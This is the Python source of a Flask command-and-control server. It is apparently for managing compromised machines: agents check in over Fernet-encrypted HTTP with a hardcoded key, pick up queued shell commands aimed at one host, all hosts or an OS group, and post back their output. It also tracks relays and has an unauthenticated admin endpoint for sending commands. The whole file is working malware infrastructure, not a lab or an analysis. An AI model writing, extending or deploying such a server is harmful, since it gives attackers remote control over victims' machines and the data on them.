from flask import Flask, request, render_template, jsonify
from cryptography.fernet import Fernet
from datetime import datetime
import sqlite3
import time
import json
import uuid

app = Flask(__name__)

# Same key for consistency
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k=' 
cipher = Fernet(SECRET_KEY)
DB_FILE = 'c2.db'

def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute(query, args)
    rv = cur.fetchall()
    conn.commit()
    conn.close()
    return (rv[0] if rv else None) if one else rv

def init_db():
    # Agents now track OS for filtering
    query_db('''CREATE TABLE IF NOT EXISTS agents 
                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)''')
    # Results now include OS column for history filtering
    query_db('''CREATE TABLE IF NOT EXISTS results 
                (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, timestamp TEXT, output TEXT)''')
    # New Tasking System
    query_db('''CREATE TABLE IF NOT EXISTS tasks 
                (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS task_receipts 
                (task_id INTEGER, hostname TEXT)''')

init_db()

def cleanup_tasks():
    """Deletes tasks that have been acknowledged by all currently ONLINE agents."""
    now = datetime.now()
    # Only consider agents who checked in within the last 5 minutes as 'active' for cleanup logic
    active_rows = query_db("SELECT hostname FROM agents")
    active_hostnames = [row['hostname'] for row in active_rows]
    
    tasks = query_db("SELECT id, target_type FROM tasks")
    for t in tasks:
        receipts = [r['hostname'] for r in query_db("SELECT hostname FROM task_receipts WHERE task_id = ?", (t['id'],))]
        
        should_delete = False
        if t['target_type'] == 'ALL':
            if all(h in receipts for h in active_hostnames): should_delete = True
        elif t['target_type'] == 'BROADCAST_WINDOWS':
            # Logic would filter for windows hosts here; simplified: if all receipts are in
            if len(receipts) > 0: should_delete = True 
        elif t['target_type'] in receipts:
            should_delete = True
            
        if should_delete:
            query_db("DELETE FROM tasks WHERE id = ?", (t['id'],))
            query_db("DELETE FROM task_receipts WHERE task_id = ?", (t['id'],))

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        decrypted_raw = cipher.decrypt(request.data).decode()
        data = json.loads(decrypted_raw)
        host = data.get('hostname', 'unknown')
        os_info = data.get('os', 'Unknown')
        os_family = "WINDOWS" if "Windows" in os_info else "LINUX"
        relay = request.headers.get('Host', 'Direct IP')

        query_db("INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?)",
                 (host, request.remote_addr, os_info, time.strftime('%H:%M:%S'), relay))

        # Check for unseen tasks (Targeted to HOST, ALL, or OS Group)
        cmd_row = query_db('''
            SELECT * FROM tasks 
            WHERE (target_type = ? OR target_type = 'ALL' OR target_type = ?)
            AND id NOT IN (SELECT task_id FROM task_receipts WHERE hostname = ?)
            ORDER BY id ASC LIMIT 1''', (host, f"BROADCAST_{os_family}", host), one=True)
        
        cmd = "none"
        if cmd_row:
            cmd = cmd_row['command']
            query_db("INSERT INTO task_receipts VALUES (?, ?)", (cmd_row['id'], host))

        return cipher.encrypt(cmd.encode())
    except Exception as e:
        return "Error", 400

@app.route('/api/stats')
def api_stats():
    agents_rows = query_db("SELECT * FROM agents")
    # Pull 100 results for a deep history
    results_rows = query_db("SELECT * FROM results ORDER BY timestamp DESC LIMIT 100")
    
    OFFLINE_THRESHOLD = 45 
    now = datetime.now()
    agents_dict = {}
    active_count = 0

    for row in agents_rows:
        agent = dict(row)
        try:
            last_seen_time = datetime.strptime(agent['last_seen'], '%H:%M:%S').time()
            last_dt = datetime.combine(datetime.now().date(), last_seen_time)
            diff = (now - last_dt).total_seconds()
            if diff < OFFLINE_THRESHOLD:
                agent['status'] = "ONLINE"
                active_count += 1
            else: agent['status'] = "OFFLINE"
        except: agent['status'] = "UNKNOWN"
        agents_dict[agent['hostname']] = agent

    # Queue status with "Seen By" info
    tasks = query_db("SELECT * FROM tasks")
    queue_data = []
    for t in tasks:
        receipts = [r['hostname'] for r in query_db("SELECT hostname FROM task_receipts WHERE task_id = ?", (t['id'],))]
        queue_data.append({
            "target": t['target_type'],
            "command": t['command'],
            "seen_list": receipts
        })

    return jsonify({
        "agents": agents_dict,
        "results": [dict(r) for r in results_rows],
        "queue": queue_data,
        "total_count": active_count
    })

@app.route('/result', methods=['POST'])
def get_result():
    try:
        decrypted_output = cipher.decrypt(request.data).decode()
        parts = decrypted_output.split('|', 1)
        if len(parts) == 2:
            host, output = parts
            agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
            os_type = "Windows" if agent and "Windows" in agent['os'] else "Linux"
            query_db("INSERT INTO results VALUES (?, ?, ?, ?, ?)",
                     (str(uuid.uuid4())[:8], host, os_type, time.strftime('%H:%M:%S'), output))
            cleanup_tasks()
        return "OK", 200
    except Exception as e:
        return "Error", 400

@app.route('/admin/send_cmd', methods=['POST'])
def send_command():
    target = request.form.get('target')
    cmd = request.form.get('command')
    query_db("INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)", 
             (target, cmd, time.strftime('%H:%M:%S')))
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)